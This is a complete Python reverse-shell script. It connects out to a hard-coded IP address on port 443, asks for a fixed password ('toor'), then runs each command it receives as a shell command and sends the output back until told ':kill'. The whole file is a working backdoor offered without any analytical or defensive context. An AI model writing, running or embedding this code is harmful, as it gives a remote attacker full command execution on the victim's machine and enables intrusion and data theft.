#!/usr/bin/python
import subprocess
import socket

host = "81.128.146.100"
port = 443
passwd = "toor"

#check pswd
def Login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwd:
        Login()
    else:
        s.send("Connected #>")
        Shell()

#Execute shell comands
def Shell():
        while True:
            data = s.recv(1024)

            if data.strip() == ":kill":
                break
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
            s.send("#>")

#start script

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
